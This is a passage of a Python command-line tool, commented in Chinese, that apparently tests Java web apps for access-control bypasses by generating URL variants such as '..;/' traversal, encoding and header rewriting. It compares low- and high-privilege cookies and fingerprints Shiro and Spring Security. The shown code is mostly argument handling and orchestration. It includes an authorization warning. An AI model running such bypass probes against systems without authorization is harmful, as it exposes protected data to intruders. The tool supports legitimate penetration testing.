                   help="只测试指定类别（逗号分隔，如 A,B,C 或 分号参数,..;/ 穿越；v3.2 新增 Q路径规范化/R编码解码/S尾缀差异/T重定向差异/U请求头重写）")
    p.add_argument("--exclude", default=None,
                   help="排除包含指定关键字的变形（逗号分隔）")
    # v3.1 新增：干跑模式与变形上限
    p.add_argument("--list-variants", dest="list_variants", action="store_true",
                   help="干跑模式：只列出将生成的变形，不发送任何请求")
    p.add_argument("--max-variants", dest="max_variants", type=int, default=None,
                   help="每个目标最多测试的变形数（默认不限）")
    # v3.2 新增：框架指纹智能模式 / 指纹单跑 / 重定向链追踪
    p.add_argument("--smart", action="store_true",
                   help="智能模式：先做框架指纹，按框架推荐类别自动筛选变形，减少噪声"
                        "（--categories 显式指定时不生效；无指纹命中时回退全类别）")
    p.add_argument("--fingerprint-only", dest="fingerprint_only", action="store_true",
                   help="仅做框架指纹识别与类别推荐，输出后退出（不发变形请求）")
    p.add_argument("--max-redirect-trace", dest="max_redirect_trace", type=int, default=None,
                   help="重定向链追踪样本上限（默认 8，0 关闭）")
    return p.parse_args()


def collect_targets(args):
    targets = list(args.url or [])
    if args.file:
        with open(args.file, "r", encoding="utf-8") as f:
            targets += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    if targets:
        return targets

    # 交互模式兜底
    t = input("请输入标准受保护 URL（如 https://host/app/admin/user/list）: ").strip()
    if not t:
        return []
    args.low_cookie = args.low_cookie or input("低权限/未登录 Cookie（可留空）: ").strip()
    args.high_cookie = args.high_cookie or input("高权限 Cookie（可留空）: ").strip()
    return [t]


def cmd_list_variants(args, targets):
    """v3.1: 干跑模式——列出变形清单后退出，不发起任何网络请求"""
    for target in targets:
        variants = generate_variants(target, args.categories, args.exclude_variants)
        total = len(variants)
        if args.max_variants:
            variants = variants[:args.max_variants]
        print(f"\n目标: {target}")
        print(f"将生成 {total} 个变形"
              + (f"，--max-variants 截取前 {len(variants)} 个" if len(variants) < total else ""))
        print("-" * 106)
        print(pad("#", 6) + pad("类别", 12) + pad("方法", 8) + "描述 / URL")
        for i, v in enumerate(variants, 1):
            print(pad(str(i), 6) + pad(v["cat"], 12) + pad(v["method"], 8)
                  + f"{v['desc']}  ->  {v['url'][:90]}")
    print(f"\n[*] 干跑完成，未发送任何请求。去掉 --list-variants 即开始实际测试。")


async def async_main(args, targets):
    print("=" * 78)
    print(f" Java 权限绕过 · 路径解析差异 URL 变形测试器 v{VERSION}")
    print(" v3.2 新增：路径规范化/编码解码/尾缀/重定向差异/请求头重写类别 + 框架指纹智能筛选")
    print(" ⚠️  仅限对已获书面授权的目标使用！")
    print("=" * 78)

    manager = RequestManager({
        "low_cookie": args.low_cookie,
        "high_cookie": args.high_cookie,
        "extra_headers": parse_headers(args.header),
        "proxy": args.proxy,
        "timeout": args.timeout,
        "tls_verify": args.tls_verify,
        "delay": args.delay,
        "jitter": args.jitter,
    })

    total_hits = total_reviews = 0
    for i, target in enumerate(targets, 1):
        print(f"\n########## [{i}/{len(targets)}] ##########")
        if getattr(args, "fingerprint_only", False):
            await run_fingerprint_only(target, args, manager)
            continue
        h, r = await run_target(target, args, args.out, manager)
        total_hits += h
        total_reviews += r

    await manager.close()

    print("\n" + "=" * 78)
    print(f" 全部完成：{len(targets)} 个目标 | ★疑似绕过 {total_hits} | △需复核 {total_reviews}")
    print(" 后续建议：对 ★ 项手工复核——确认响应体是否真实返回受保护数据（见证据目录），")
    print(" 并检查 Shiro 规则顺序、Spring Security anyRequest 兜底、Filter dispatcher 类型、")
    print(" AntPathMatcher 与 PathPattern 的版本差异等鉴权配置。")
    print(" v3.2：结合报告中的\"框架指纹\"板块，优先核对已识别组件对应的路径匹配差异点；")
    print(" 重定向链分析中的\"落点 2xx 且内容与基线差异显著\"项需人工确认是否为鉴权偏差。")
    print("=" * 78)
    sys.exit(1 if total_hits else 0)


def main():
    args = parse_args()

    # v3.1 [D3 修复] 旧参数名弃用提示
    if "--verify" in sys.argv:
        print("[!] 提示：--verify 已更名为 --tls-verify（旧名仍兼容，后续版本将移除）")
    if "--no-verify" in sys.argv:
        print("[!] 提示：--no-verify 已更名为 --skip-recheck（旧名仍兼容，后续版本将移除）")

    # 加载 YAML 配置
    if args.config:
        yaml_cfg = load_yaml_config(args.config)
        args = merge_config(args, yaml_cfg)

    # Cookie 文件兜底
    if not args.low_cookie and args.low_cookie_file:
        args.low_cookie = read_cookie_file(args.low_cookie_file)
    if not args.high_cookie and args.high_cookie_file:
        args.high_cookie = read_cookie_file(args.high_cookie_file)

    # CLI --exclude 优先于 YAML
    if args.exclude:
        args.exclude_variants = [e.strip() for e in args.exclude.split(",")]
    elif not getattr(args, "exclude_variants", None):
        args.exclude_variants = []

    targets = [t for t in collect_targets(args) if t.startswith("http://") or t.startswith("https://")]
    if not targets:
        print("[-] 未提供有效目标（URL 必须以 http:// 或 https:// 开头）")
        sys.exit(1)

    # v3.1: 干跑模式——只列变形，不发包（在默认值回填前执行，无需网络参数）
    if args.list_variants:
        cmd_list_variants(args, targets)
        sys.exit(0)

    apply_defaults(args)
    asyncio.run(async_main(args, targets))


if __name__ == "__main__":
    main()
